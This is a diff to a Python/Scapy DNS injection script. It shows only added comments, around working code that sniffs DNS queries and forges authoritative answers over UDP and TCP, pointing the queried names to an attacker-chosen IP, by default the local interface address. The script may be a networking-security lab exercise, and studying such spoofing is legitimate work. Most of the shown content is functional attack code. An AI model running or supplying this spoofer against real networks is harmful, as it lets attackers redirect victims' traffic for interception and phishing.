@@ -20,15 +20,15 @@ def dnsinject(pkt):
         else: # hostnames file not given
             redir_ip = get_ip(str(d["interface"]))
         
-        # SPOOFING TIME
+        # SPOOFING TIME i.e. respond to dns query 
         if pkt.haslayer(UDP):
-            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
-            udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
-            dnsrr = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=15, rdata=redir_ip) # dns resource record
+            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # swap the ip src and dst for the packet
+            udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) # swap the udp src and dst ports for the packet
+            dnsrr = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=15, rdata=redir_ip) # dnsrr = DNS Resource Record
             dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, ancount=1, qdcount=1, nscount=0, arcount=0, an=dnsrr)
             spoof = ip/udp/dns
             send(spoof)
-        elif pkt.haslayer(TCP):
+        elif pkt.haslayer(TCP): # same as ^ but for TCP
             ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
             tcp = TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport)
             dnsrr = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=15, rdata=redir_ip)
@@ -50,7 +50,7 @@ if __name__ == "__main__":
 
     # whether hostfile specified or not
     if d["hostfile"] == None:
-        redir_ip = get_ip(str(d["interface"]))
+        redir_ip = get_ip(str(d["interface"])) # should be local ip
         print(redir_ip) # FOR TESTING
     else:
         redir_ip = ""
